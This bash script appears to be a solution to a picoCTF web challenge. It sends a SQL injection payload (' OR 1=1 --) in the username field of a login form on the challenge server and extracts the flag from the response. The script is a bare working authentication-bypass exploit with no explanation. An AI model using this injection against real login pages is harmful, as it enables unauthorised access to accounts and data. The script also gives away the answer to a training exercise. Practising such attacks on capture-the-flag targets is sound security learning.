#!/bin/bash
url=https://jupiter.challenges.picoctf.org/problem/39720/login.php

curl -sL -d "username='+OR+1=1+--" -X POST $url | grep -oE "picoCTF{.*}"